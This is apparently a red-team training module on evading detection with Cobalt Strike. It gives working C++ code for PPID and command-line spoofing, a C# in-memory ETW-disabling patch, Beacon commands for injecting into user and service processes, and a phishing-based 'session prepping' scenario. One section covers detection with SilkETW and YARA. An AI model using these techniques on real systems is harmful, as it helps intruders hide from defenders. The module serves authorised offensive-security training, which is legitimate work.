# SpawnTo

Cobalt Strike's `spawnto` value controls which binary is used as a temporary process for various post-exploitation workflows.  Execute this PowerShell one-liner using `powerpick` and keep an eye on Process Hacker.
```
beacon> powerpick Start-Sleep -s 30
```

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/spawnto/rundll32.png)

We'll see that rundll32 is spawned as a child of the current Beacon process (in this case, PowerShell).  This is Cobalt Strike's default spawnto and is highly monitored as arbitrary processes spawning rundll32 is not a normal occurrence.  In fact, you will probably find that Defender kills your Beacon (note the PID correlation).  This is a behavioural detection and is not circumvented using AMSI bypasses in Beacon.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/spawnto/rundll32-blocked.png)

You can change the spawnto binary for an individual Beacon during runtime with the `spawnto` command.  There is a separate configuration for x86 and x64.
```
beacon> help spawnto
Use: spawnto [x86|x64] [c:\path\to\whatever.exe]


Sets the executable Beacon spawns x86 and x64 shellcode into. You must specify a
full-path. Environment variables are OK (e.g., %windir%\sysnative\rundll32.exe)

Do not reference %windir%\system32\ directly. This path is different depending
on whether or not Beacon is x86 or x64. Use %windir%\sysnative\ and 
%windir%\syswow64\ instead.

Beacon will map `%windir%\syswow64\` to system32 when WOW64 is not present.
```

Obviously, the idea is to pick something that would not be out of place for the current Beacon context.  For demonstration purposes, let's spawn a new Beacon and change it to Notepad.
```
beacon> spawnto x64 %windir%\sysnative\notepad.exe
beacon> powerpick Start-Sleep -s 30
```

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/spawnto/notepad.png)

This time, the Beacon survives.  There is nothing special happening here - Beacon uses the CreateProcess API to start whatever spawnto it's configured with.  If you want to set the default spawnto in your C2 profile, you can do so in the post-ex block.
```json
post-ex {
    set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
    set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
}
```

# PPID Spoofing

When using the CreateProcess API, by default, the resulting process will spawn as a child of the caller.  This is why in the previous section we saw rundll32 and notepad spawn as children of PowerShell.  However, the "PPID spoofing" technique allows the caller to change the parent process for the spawned process.  So if our Beacon was running in powershell.exe, we can spawn processes as children of a completely different process, such as explorer.exe.

This will cause applications such as Sysmon to log the process creation under the new parent.  This is especially useful if you have a Beacon running in an unusual process (e.g. from an initial compromise, lateral movement or some other exploit delivery) and process creation events would raise high severity alerts or be blocked outright.

The magic is achieved in the [STARTUPINFOEX](https://docs.microsoft.com/en-us/windows/win32/api/winbase/ns-winbase-startupinfoexw) struct, which has an **LPPROC_THREAD_ATTRIBUTE_LIST** property.  This allows us to pass additional attributes to the CreateProcess call.  The attributes themselves are listed [here](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute).  For the purpose of PPID spoofing, the one of interest is **PROC_THREAD_ATTRIBUTE_PARENT_PROCESS**.

##### The lpValue parameter is a pointer to **a handle to a process** to use instead of the calling process as the parent for the process being created. The process to use must have the PROCESS_CREATE_PROCESS access right.

Before looking at Cobalt Strike, let's do this in code.  I'm going to bring in the target parent PID on the command line for ease of use.  Then initialise the STARTUPINFOEX struct.
```cpp
#include <iostream>
#include <Windows.h>
#include <winternl.h>

int main(int argc, const char* argv[])
{
	// Get parent process PID from the command line
	DWORD parentPid = atoi(argv[1]);

	// Initialise STARTUPINFOEX
	STARTUPINFOEX sie = { sizeof(sie) };
}
```

The next step is to allocate a region of memory to hold the attribute list, but we need to know the required size first.  The list can have multiple attributes, but as we're only interested in PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, the size is **1**.  So we call InitializeProcThreadAttributeList and provide a NULL destination, but the lpSize variable will become populated with the size we need.  Even though this API returns a bool, this call will always return FALSE.
```cpp
// Call InitializeProcThreadAttributeList once
// it will return FALSE but populate lpSize
SIZE_T lpSize;
InitializeProcThreadAttributeList(NULL, 1, 0, &lpSize);
```

With that, use malloc to allocate the memory region on the lpAttributeList property of STARTUPINFOEX.  Then we call InitializeProcThreadAttributeList again, but this time, set the correct location.  This time, it should return TRUE.
```cpp
// Allocate memory for the attribute list on STARTUPINFOEX
sie.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);

// Call InitializeProcThreadAttributeList again, it should return TRUE this time
if (!InitializeProcThreadAttributeList(sie.lpAttributeList, 1, 0, &lpSize))
{
	printf("InitializeProcThreadAttributeList failed. Error code: %d.\n", GetLastError());
	return 0;
}
```

Get a handle to the parent process and pass that into a call to UpdateProcThreadAttribute.
```cpp
// Get the handle to the process to act as the parent
HANDLE hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parentPid);

// Call UpdateProcThreadAttribute, should return TRUE
if (!UpdateProcThreadAttribute(sie.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL))
{
	printf("UpdateProcThreadAttribute failed. Error code: %d.\n", GetLastError());
	return 0;
}
```

All that's left to do is call CreateProcess, ensuring to pass the EXTENDED_STARTUPINFO_PRESENT flag.
```cpp
// Call CreateProcess and pass the EXTENDED_STARTUPINFO_PRESENT flag
PROCESS_INFORMATION pi;

if (!CreateProcess(
	L"C:\\Windows\\System32\\notepad.exe",
	NULL,
	0,
	0,
	FALSE,
	EXTENDED_STARTUPINFO_PRESENT,
	NULL,
	L"C:\\Windows\\System32",
	&sie.StartupInfo,
	&pi))
{
	printf("CreateProcess failed. Error code: %d.\n", GetLastError());
	return 0;
}

printf("PID created: %d", pi.dwProcessId);
return 1;
```

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/notepad.png)

A well-behaved program will also call DeleteProcThreadAttributeList after the process has been created.
```cpp
DeleteProcThreadAttributeList(sie.lpAttributeList);
```

Cobalt Strike's `ppid` command can be used to set the parent process for all Beacon post-ex capabilities that spawn a process. Everything from `shell`, `run`, `execute-assembly`, `shspawn` and so on.

As we know, Beacon will use itself as the parent by default.  Running `shell ping`, we can see cmd.exe is spawned as a child of powershell.exe
![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/ping-no-spoof.png)

Use the PPID command to change it to explorer and run `shell ping` again.
```
beacon> ppid 2704
[*] Tasked beacon to spoof 2704 as parent process
```

cmd.exe is now a child of explorer.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/ping-spoof.png)
![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/ppid/ping-spoof-ph.png)

To reset the PPID back to the Beacon process, use the `ppid` command without parameters.
```
beacon> ppid
[*] Tasked beacon to use itself as parent process
```

# Command Line Spoofing

Processes can be started with command line arguments.  For instance, if we do:
```
C:\>notepad C:\Windows\System32\WindowsCodecsRaw.txt

```

Notepad will launch and open the specified file.  Logging tools and process inspection tools can read these arguments, as they are stored in the Process Environment Block (PEB) of the process itself.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/cmdline/notepad-default.png)

However, there are plenty of times where we may want to obscure our command line arguments to hide our true intent or mislead defenders.  This can be done using the following high-level steps:

-   Create a process with "fake" arguments (these are the arguments you want to get logged) in a suspended state.
-   Reach into the PEB and find the RTL_USER_PROCESS_PARAMETERS.
-   Overwrite the command line arguments in this structure with the actual arguments you want executed.
-   Resume the process.  When the process resumes, it executes the new arguments.

Create the target process with the fake arguments with the CREATE_SUSPENDED flag.

```cpp
#include <iostream>
#include <Windows.h>

int main()
{
    // Create the process with fake args
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    WCHAR fakeArgs[] = L"notepad totally-fake-args.txt";

    if (CreateProcess(
        L"C:\\Windows\\System32\\notepad.exe",
        fakeArgs,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\",
        &si,
        &pi))
    {
        printf("Process created: %d", pi.dwProcessId);
    }
}
```

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/cmdline/fake-args.png)

Next, we need to use the native NtQueryInformationProcess API to query the process and populate a PROCESS_BASIC_INFORMATION struct.  One of the properties on this struct is the base address of the PEB.  For that, we need the **typedef** for the function.
```cpp
#include <iostream>
#include <Windows.h>
#include <winternl.h>

typedef NTSTATUS(*QueryInformationProcess)(IN HANDLE, IN PROCESSINFOCLASS, OUT PVOID, IN ULONG, OUT PULONG);

```

Resolve the location of the API from ntdll.dll.
```cpp
// Resolve the location of the API from ntdll.dll
HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
QueryInformationProcess NtQueryInformationProcess = (QueryInformationProcess)GetProcAddress(ntdll, "NtQueryInformationProcess");
```
  

Then we can call it.
```cpp
// Call NtQueryInformationProcess to read the PROCESS_BASIC_INFORMATION
PROCESS_BASIC_INFORMATION pbi;
DWORD length;

NtQueryInformationProcess(
    pi.hProcess,
    ProcessBasicInformation,
    &pbi,
    sizeof(pbi),
    &length);
```
  

Read the PEB using ReadProcessMemory.
```cpp
// With the PEB base address, we can read the PEB structure itself
PEB peb;
SIZE_T bytesRead;

ReadProcessMemory(
    pi.hProcess,
    pbi.PebBaseAddress,
    &peb,
    sizeof(PEB),
    &bytesRead);
```

Now from the PEB, we have the location of the ProcessParameters.  Read those next.
```cpp
// Read the Process Parameters
RTL_USER_PROCESS_PARAMETERS rtlParams;

ReadProcessMemory(
    pi.hProcess,
    peb.ProcessParameters,
    &rtlParams,
    sizeof(RTL_USER_PROCESS_PARAMETERS),
    &bytesRead);
```

Craft the new arguments and write them into the CommandLine buffer.
```cpp
// Craft new args and write them into the command line buffer
WCHAR newArgs[] = L"notepad C:\\Windows\\System32\\WindowsCodecsRaw.txt";
SIZE_T bytesWritten;

WriteProcessMemory(
    pi.hProcess,
    rtlParams.CommandLine.Buffer,
    newArgs,
    sizeof(newArgs),
    &bytesWritten);
```

Finally, resume the process.
```cpp
ResumeThread(pi.hThread);
```

Notepad will now open WindowsCodecsRaw.txt, but Sysmon has recoded the fake args.
```
Process Create:
ProcessId: 7056
Image: C:\Windows\System32\notepad.exe
CommandLine: notepad totally-fake-args.txt
CurrentDirectory: C:\
```

However, if we inspect it with Process Hacker, we see something rather curious.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/cmdline/notepad-spoofed-partial.png)

It's the path to the real file and it's truncated.  So what's happening here?

First, Process Hacker provides point-in-time data.  It will re-read the PEB each time we close and re-open the properties window for a process.  So logically, it's now reading the new args we wrote into the PEB.

Second, the data within this buffer is actually a **UNICODE_STRING** which looks something like this:
```cpp
struct UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
}
```
  

You can see that it has a Buffer (holds the actual data) and a Length (the length of the data).  When the process was created, the Length is **58** (_notepad totally-fake-args.txt_), but the new args (_notepad C:\\Windows\\System32\\WindowsCodecsRaw.txt_) has a length of **96**.  We are updating the content of the buffer, but not the length field; and if you read 58 bytes of the new args, it takes you as far as highlighted in bold: _**notepad C:\\Windows\\System32\\W**indowsCodecsRaw.txt_.

Process Hacker, Process Explorer and possibly others only read up to the value given by this field, so we can trick them by intentionally making it smaller, thus truncating the string at a strategic point (e.g. in this instance, what if it only showed "notepad" and not the path...).  _This is left as an exercise to the reader._

Command Line arg spoofing is controlled in Cobalt Strike with the `argue` command.
```
beacon> help argue
Use: argue [command] [fake arguments]
     argue [command]
     argue

Spoof [fake arguments] for [command] processes launched by Beacon.
This option does not affect runu/spawnu, runas/spawnas, or post-ex jobs.

Use argue [command] to disable this feature for the specified command.

Use argue by itself to list programs with defined spoofed arguments.
```

One thing to note about the implementation is that it also does not adjust the length field or allocate new memory, so the fake args should be as long, or longer than the real ones.

Let's start with a baseline:
```
beacon> shell whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                        
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Group used for deny only                          
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192  
```

Because the shell command was used here, Sysmon logs the creation of cmd.exe with the associated command line arguments.
```
Process Create:
ProcessId: 5096
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.exe /C whoami /groups
```

If we still wanted to run whoami via cmd, but without it appearing on the command line, we could do:
```
beacon> argue C:\Windows\system32\cmd.exe /c ping 127.0.0.1 -n 10
[*] Tasked beacon to spoof 'C:\Windows\system32\cmd.exe' as '/c ping 127.0.0.1 -n 10'

beacon> shell whoami /groups
```

We get the same output, but Sysmon logged it as:
```
Process Create:
ProcessId: 2588
Image: C:\Windows\System32\cmd.exe
CommandLine: C:\Windows\system32\cmd.exe /c ping 127.0.0.1 -n 10
```

Command Line spoofing is not a silver bullet, as in this case a process creation event for whoami.exe was still created.  The technique is much more effective when running commands that don't spawn additional processes.

# Network Connections

When a process makes a network connection it can be logged in Sysmon, a network monitoring device, or seen using a local tool such as netstat.

This is an example Sysmon event for when Beacon (running in powershell.exe) performs a check-in.  We can see a connection to 10.10.5.39 (Redirector 1) is made on port 80.  In a target environment, defenders would likely see the outbound connection going to their boundary firewall or web proxy.

A new event will be generated for every check-in made by the Beacon, so if you're on `sleep 0`, get ready to be flooded.
```
Network connection detected:
ProcessId: 5696
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: RTO2\cbridges
Protocol: tcp
Initiated: true
SourceIp: 10.10.120.106
SourceHostname: wkstn-1.redteamops2.local
SourcePort: 65189
SourcePortName: -
DestinationIp: 10.10.5.39
DestinationHostname: -
DestinationPort: 80
DestinationPortName: http
```

There are no magic bypasses to this per se - as the operator, you should consider whether or not it makes sense for your host process to be making network connections.  An HTTP Beacon will make HTTP/S connections, the TCP Beacon TCP connections and the SMB Beacon named pipe connections.

You may consider a web browser process more appropriate for HTTP/S connections.

# Session Prepping

Session Prepping is a term to describe how you can "prep" your session after landing an initial Beacon on a machine, which is an important step after initial compromise or lateral movement.  Your strategies and TTPs should be defined upfront based on the threat you're emulating, but for the sake of this section I'm going to provide the following:

Send a weaponised Word document in a phishing email that will locate a running instance of Edge, IE or Chrome, then inject a Beacon payload into it.  If an instance is not found, spawn one.  Once the Beacon has landed, set the spawnto to whichever browser binary we landed in (or spawned).  Keep the PPID set to the Beacon process.

Rationale:

-   Browsers make outbound HTTP/S connections by design.
-   Edge, IE and Chrome are the most popular (you could include Firefox as well).
-   Browsers legitimately spawn new child processes per tab.

Beacon is running in msedge.exe, PID 1048.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/session-prep/msedge-beacon.png)

On the target, the process tree looks like this:

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/session-prep/msedge-ph.png)

Of the 7 child processes there, one of them is a Beacon post-ex capability running, the others are legitimate tabs.

---

With lateral movement, we often don't get much of a choice in what we're executing on the target, particularly when using the default `jump` commands.  For example, `jump winrm64` will land us in a PowerShell process and `jump psexec64` in the default spawnto of the C2 profile.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/session-prep/rundll32-beacon.png)

After jumping with psexec, the Beacon is living in rundll32.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/session-prep/rundll32-ph.png)

rundll32.dll is a major outlier here because it's running in Session ID 0, but not PPID'd to an existing service executable.  This would be true for whatever spawnto we were using, as this is just the nature of how Cobalt Strike's psexec implementation works.  The service and service executable are cleaned up and removed after execution, which leaves the process hosting the payload in this orphaned state.  We don't want to continue operating in this Beacon, so we should prep the session before performing any post-ex actions on this host.

There are two paths we can take from here depending on what we want to achieve.

If the RTO2\amoss user is the target, we can move into their desktop session and live entirely in their user space.  We would be dropping down from high-integrity to medium, but that might not even matter.  The easiest method of doing this is to inject a payload into one of the user's processes (there aren't many here, so let's just use explorer).

beacon> inject 4628 x64 smb
[+] established link to child beacon: 10.10.120.75

  

The Beacon chain is now going like this:
```
------------------------      ------------------------       -------------------------
|  cbridges @ WKSTN-1  |      |   SYSTEM @ WKSTN-2    |      |    amoss @ WKSTN-2    |
|   msedge.exe (1048)  |  =>  |  rundll32.dll (5844)  |  =>  |  explorer.exe (4628)  | 
------------------------      ------------------------       -------------------------
```

So next, we need to `exit` the SYSTEM session and `link` to the session running as amoss from cbridges.  We can leave the PPID since it's ok for processes to be a child of explorer, and then set the spawnto to something the user might execute.
```
beacon> spawnto x64 %windir%\\sysnative\\notepad.exe
beacon> spawnto x86 %windir%\\syswow64\\notepad.exe
```

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/session-prep/spawnto-notepad.png)

The other option, is if we want to maintain our SYSTEM level access in Session 0.  The strategy that makes the most sense to me is to hide ourselves as a child of an existing service executable.  Most of these are found as children of **services.exe** (the "Services and Controller app") and the vast majority of default Windows services run as **svchost.exe**.  Many of these will also spawn their own children such as SearchApp.exe, taskhostw.exe, ctfmon.exe and others.

The "problem" with these core Windows processes is that they are protected, so you can't arbitrarily open handles to them, even as SYSTEM.
```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> inject 840 x64 smb
[-] could not open process 840: 5
[-] could not connect to pipe
```

A more reliable bet is to find a third-party service, because they will often have a lower level of protection.  Let's have a look at the Amazon SSM Agent as an example.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/session-prep/ssm-agent.png)

**amazon-ssm-agent.exe** is the service executable for the AmazonSSMAgent service.
```
SERVICE_NAME: AmazonSSMAgent
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Amazon SSM Agent
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

This service spawns **ssm-agent-worker.exe** as children.  This could be a good candidate - we could inject into the agent process and set our spawnto to the worker executable.
```
beacon> inject 2796 x64 smb
[+] established link to child beacon: 10.10.120.75

beacon> spawnto x64 %ProgramFiles%\Amazon\SSM\ssm-agent-worker.exe
```

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/session-prep/agent-worker.png)

These are just some examples based on the situation you find yourself in.  You should be willing to enumerate a host and adapt to blend into what looks "normal".

# Image Load Events

An "image load" is when a process loads a DLL into memory.  This is a perfectly legitimate thing to happen, and all processes will have a boat-load of DLLs loaded.  Here's an example of a normal Notepad process.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/image-load/notepad-normal.png)

Ingesting all image load events into a SIEM is not completely viable due to the huge volume.  But defenders can selectively forward specific image loads based on known attacker TTPs.  One example is the use of `execute-assembly`.

The Cobalt Strike implementation will:

-   Spawn a temporary process (whatever is configured as the spawnto binary).
-   Load the .NET CLR (Common Language Runtime) into that process.
-   Execute the given .NET assembly in memory of that process.
-   Get the output and kill the process.

The .NET CLR (and other associated DLLs) is usually only loaded by .NET assemblies - native programs tend not to.  If your spawnto is set to a native binary (such as notepad) and you use `execute-assembly`, defenders could see that a native binary has loaded the CLR.

Here's an example Sysmon event where notepad.exe has loaded **clr.dll**.
```
Image loaded:
ProcessId: 696
Image: C:\Windows\System32\notepad.exe
ImageLoaded: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll
Description: Microsoft .NET Runtime Common Language Runtime - WorkStation
```

One way to avoid this style of detection is to set the spawnto to a .NET assembly - there are plenty that exist on Windows by default.

Image load events can also be helpful in tracking down capabilities such as Mimikatz, because it can load various DLLs that handle cryptography, and interactions with the Windows Credential Vault etc.

# Named Pipes Names

Beacon uses SMB named pipes in four main ways.

1.  Retrieve output from some fork and run commands such as execute-assembly and powerpick.
2.  Connect to Beacon's SSH agent (not something we use in the course).
3.  The SMB Beacon's named pipe stager (also not often used).
4.  C2 comms in the SMB Beacon itself.

Sysmon event ID 17 (pipe created) and 18 (pipe connected) can be used to spot the default pipe name used by Beacon in these situations.

The default pipe name for post-ex commands is `postex_####`; the default for the SSH agent is `postex_ssh_####`; the default for the SMB Beacon's stager is `status_##`; and the default for the main SMB Beacon C2 is `msagent_##`.  In each case, the #'s are replaced with random hex values.

Execute a fork and run command:
```
beacon> powerpick Get-ChildItem
```

We should get an event like this (the image name is the spawnto process):
```
Pipe Created:
EventType: CreatePipe
ProcessId: 4664
PipeName: \postex_7b88
Image: C:\Windows\system32\notepad.exe
```

We get the same by spawning an SMB Beacon.
```
beacon> spawn x64 smb
[*] Tasked beacon to spawn (x64) windows/beacon_bind_pipe (\\.\pipe\msagent_36)
[+] host called home, sent: 255536 bytes
[+] established link to child beacon: 10.10.120.106

Pipe Created:
EventType: CreatePipe
ProcessId: 5044
PipeName: \msagent_36
Image: C:\Windows\system32\notepad.exe
```

Many Sysmon configurations only log specific (known) pipe names, such as the defaults used in various toolsets.  So in most cases, changing the pipe names to something relatively random will get you by most times.  Some operators choose to use names that are used by legitimate applications - a good example is the "mojo" pipe name that Google Chrome uses.  If you go down this route, make sure your ppid and spawnto match this pretext, otherwise you're going to create anomalous logs.

The `pipename_stager` and `ssh_pipename` Malleable C2 directives are global options (not part of a specific block).

To change the pipe name used in post-ex commands, use the `set pipename` directive in the `post-ex` block.  This can take a comma-separated list of names, and can include the # character for some randomisation.
```json
post-ex {
        set pipename "totally_not_beacon, legitPipe_##";
}
```

# Event Tracing for Windows (ETW)

Event Tracing for Windows (ETW) provides a mechanism to trace and log events that are raised by user-mode applications.  [SilkETW](https://github.com/mandiant/SilkETW) takes most of the pain out of consuming ETW events for a wide array of offensive and defensive purposes.  It's next largest strengths (in my view) are the formats it can output to (URL, Windows Event Log, JSON) and it's integration with [YARA](https://virustotal.github.io/yara/).

A popular use case for it is to provide .NET introspection - that is, to detect .NET assemblies in memory.  Let's explore ways to detect Rubeus in-memory...

When a .NET assembly is loaded, the Microsoft-Windows-DotNETRuntime provider produces an event called `AssemblyLoad`.  The data contained is the fully qualified name of the assembly.

```
C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -f EventName -fv Loader/AssemblyLoad

███████╗██╗██╗   ██╗  ██╗███████╗████████╗██╗    ██╗
██╔════╝██║██║   ██║ ██╔╝██╔════╝╚══██╔══╝██║    ██║
███████╗██║██║   █████╔╝ █████╗     ██║   ██║ █╗ ██║
╚════██║██║██║   ██╔═██╗ ██╔══╝     ██║   ██║███╗██║
███████║██║█████╗██║  ██╗███████╗   ██║   ╚███╔███╔╝
╚══════╝╚═╝╚════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚══╝╚══╝
                  [v0.8 - Ruben Boonen => @FuzzySec]

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 6
```

Whilst SilkETW is running, execute `C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe`.  Review the JSON file and we see the following entries: `"FullyQualifiedAssemblyName":"Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"`

Based on this we can create a YARA rule.  Save this to `C:\Users\Administrator\Desktop\YARA\rubeus.yara`.
```json
rule Rubeus_FullyQualifiedAssemblyName
{
    strings:
        $fqan = "Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" ascii nocase wide
    condition:
        $fqan
}
```

Run SilkETW again, but provide the `-y` and `-yo` options for YARA.  Execute Rubeus again and the rule should trigger.
```
C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -f EventName -fv Loader/AssemblyLoad -y C:\Users\Administrator\Desktop\YARA -yo Matches

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 8
     -> Yara match: Rubeus_FullyQualifiedAssemblyName
```

The `Loader/ModuleLoad` event will show modules that have been loaded by an assembly.  Applications that have been compiled as Debug will attempt to load its associated PDB database.  In this case we'd see `"ManagedPdbBuildPath":"C:\\Tools\\Rubeus\\Rubeus\\obj\\Debug\\Rubeus.pdb"` in the JSON output.

We can add another YARA rule to the file to search for `"Rubeus.pdb"` and run again.
```json
rule Rubeus_ProgramDatabase
{
    strings:
        $pdb = "Rubeus.pdb" ascii nocase wide
    condition:
        $pdb
}

C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -y C:\Users\Administrator\Desktop\YARA -yo Matches

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 596
     -> Yara match: Rubeus_FullyQualifiedAssemblyName
     -> Yara match: Rubeus_ProgramDatabase
```

IL (intermediary language) stubs are dynamically generated by the CLR (common language runtime).  They handle the marshalling and invocation of native methods (ala P/Invoke) and can therefore be used to find assemblies using interop to access unmanaged code.  We can filter on these with `-fv ILStub/StubGenerated`.

From that, we'll see namespaces such as `Rubeus.Interop/TOKEN_INFORMATION_CLASS` and `Rubeus.Interop/LSA_STRING`.
```json
rule Rubeus_Interop
{
    strings:
        $tic = "Rubeus.Interop/TOKEN_INFORMATION_CLASS" ascii nocase wide
        $lsa = "Rubeus.Interop/LSA_STRING" ascii nocase wide
    condition:
        any of them
}
```
```
C:\Tools\SilkETW\SilkETW\bin\x86\Release>SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\Users\Administrator\Desktop\etw.json -y C:\Users\Administrator\Desktop\YARA -yo Matches

[+] Collector parameter validation success..
[>] Starting trace collector (Ctrl-c to stop)..
[?] Events captured: 664
     -> Yara match: Rubeus_FullyQualifiedAssemblyName
     -> Yara match: Rubeus_ProgramDatabase
     -> Yara match: Rubeus_Interop
```

An interesting note is that just running `Rubeus.exe` will not trigger the `Rubeus_Interop` rule.  Because the assembly did not execute any code that uses interop, the no IL stubs were generated that would trigger it. `Rubeus.exe klist` will trigger the rule.

If executing an exe on disk from a shell, the easiest (and most ridiculous) way to disable ETW events is to set the `COMPlus_ETWEnabled` environment variable to `0`.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/etw/complus.png)

To disable ETW in code, we can take a cue from the popular [in-memory patching technique](https://rastamouse.me/memory-patching-amsi-bypass/) to disable AMSI.  Advapi32.dll exports an API called **EventWrite** which forwards to **EtwEventWrite** in ntdll.dll.  We can patch instructions in memory at one of these locations to prevent the API writing events.

Consider the following boilerplate code:
```cs
// pretend this is coming down a C2 as a byte[]
var bytes = File.ReadAllBytes(@"C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe");

// load the assembly
var assembly = Assembly.Load(bytes);

// invoke its entry point with arguments
assembly.EntryPoint.Invoke(null, new object[] { args });
```

Prior to loading the assembly, we'd like to locate one of those APIs (let's go with the lower-level EtwEventWrite) and write a `RET` at the beginning.

 ##### A simple RET works fine for x64, but if on x86 you will need to adjust the stack first.

The high level steps are as follows:

-   Get the memory address of ntdll in the current process.
-   Get the memory address of EtwEventWrite from ntdll.
-   Make that region of memory writeable
-   Copy the patch
-   Restore the memory permissions

```cs
// get location of ntdll.dll
var hModule = LoadLibrary("ntdll.dll");
Console.WriteLine("ndtll: 0x{0:X}", hModule.ToInt64());

// find EtwEventWrite
var hfunction = GetProcAddress(hModule, "EtwEventWrite");
Console.WriteLine("EtwEventWrite: 0x{0:X}", hfunction.ToInt64());

var patch = new byte[] { 0xC3 };

// mark as RW
VirtualProtect(hfunction, (UIntPtr)patch.Length, 0x04, out var oldProtect);
Console.WriteLine("Memory: 0x{0:X} -> 0x04", oldProtect);

// write a ret
Marshal.Copy(patch, 0, hfunction, patch.Length);

// restore memory
VirtualProtect(hfunction, (UIntPtr)patch.Length, oldProtect, out _);
Console.WriteLine("Memory: 0x04 -> 0x{0:X}", oldProtect);
```

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/etw/etweventwrite.png)

**LoadLibrary** and **GetProcAddress** are native APIs that you must P/Invoke.  If you want to give it a try with D/Invoke, take a look at `Generic.GetLibraryAddress()`.

Where Cobalt Strike does have an `amsi_disable` directive in Malleable C2, it has no equivalent like "etw_disable".  The most viable way to integrate this style of ETW patching with execute-assembly, is via a user defined reflective loader (discussed in a later module).

# RWX & Cleanup

As we know, memory regions have a protection level.  When writing our process injection applications, we were careful not to allocate memory as RWX.  Instead, we opt for RW and then switch RX.  But Beacon's default reflective loader actually undoes this hard work.

Here we have injected Beacon shellcode into notepad.exe.

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/rwx/beacon.png)

If we inspect the memory regions in this process, we'll see the following:

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/evasion/rwx/notepad-ph.png)

The two highlighted lines are the ones of interest.  The RX region is the one we allocated in our injector and contains Beacon's reflective loader.  The RWX region is where the actual Beacon payload is running.  So there are two issues here.

1.  We've got a dangling memory region that we don't need anymore.
2.  Beacon's RWX region is an OPSEC concern that we don't want.

Both can be fixed in Cobalt Strike's malleable C2 profile.

